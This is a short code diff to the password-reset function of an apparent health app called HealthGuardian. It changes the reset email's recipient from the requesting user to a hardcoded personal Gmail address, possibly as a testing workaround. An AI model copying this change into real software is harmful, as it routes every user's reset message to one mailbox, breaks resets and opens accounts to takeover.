@@ -72,7 +72,7 @@ def forgot_password():
             resend.api_key = os.getenv('RESEND_API_KEY')
             resend.Emails.send({
                 "from": "HealthGuardian <onboarding@resend.dev>",
-                "to": email,
+                "to": "yuvrajbasnet1234@gmail.com",
                 "subject": "HealthGuardian - Password Reset",
                 "text": f"""Hi {user.fullname},
 
